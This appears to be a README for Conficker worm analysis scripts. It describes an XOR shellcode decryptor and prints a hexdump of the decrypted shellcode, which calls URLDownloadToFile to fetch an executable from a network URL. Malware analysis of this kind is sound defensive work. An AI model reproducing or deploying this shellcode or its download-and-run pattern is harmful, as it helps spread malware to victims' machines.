# Worm Conflicker Analysis scripts

conflicker_shellcode_decryptor.py - Carries out decryption of the shellcode used by conflicker/netapi worm.It's a one-byte XOR decryptor.

The output looks like,

00000170  83 c6 07 e8 18 00 00 00  33 d2 52 52 8b cc 66 c7  |........3.RR..f.|<br>
00000180  01 78 2e 51 ff 77 04 52  52 51 56 52 ff 37 ff e0  |.x.Q.w.RRQVR.7..|<br>
00000190  ad 51 56 95 8b 4b 3c 8b  4c 0b 78 03 cb 33 f6 8d  |.QV..K<.L.x..3..|<br>
000001a0  14 b3 03 51 20 8b 12 03  d3 0f 00 c0 0f bf c0 c1  |...Q ...........|<br>
000001b0  c0 07 32 02 42 80 3a 00  75 f5 3b c5 74 06 46 3b  |..2.B.:.u.;.t.F;|<br>
000001c0  71 18 72 db 8b 51 24 03  d3 0f b7 14 72 8b 41 1c  |q.r..Q$.....r.A.|<br>
000001d0  03 c3 8b 04 90 03 c3 5e  59 c3 60 a2 8a 76 26 80  |.......^Y.`..v&.|<br>
000001e0  ac c8 75 72 6c 6d 6f 6e  00 99 23 5d d9 68 74 74  |..urlmon..#].htt|<br>
000001f0  70 3a 2f 2f 31 39 32 2e  31 36 38 2e 31 38 38 2e  |p://192.168.188.|<br>
00000200  32 3a 32 31 39 31 2f 78  6d 7a 69 00 89 97 ab bd  |2:2191/xmzi.....|<br>
00000210  a2 8d 89 94 b0 80 80 ae  a5 a7 80 93 89 8d b4 a5  |................|<br>
00000220  90 9c a7 93 87 97 a2 85  96 9c 90 94 95 9c a9 82  |................|<br>

The decrypted output indicates the shellcode using 'urlmon.dll' of which 'URLDownloadToFile' function is used to download the executable from the URL mentioned in the decrypted buffer.
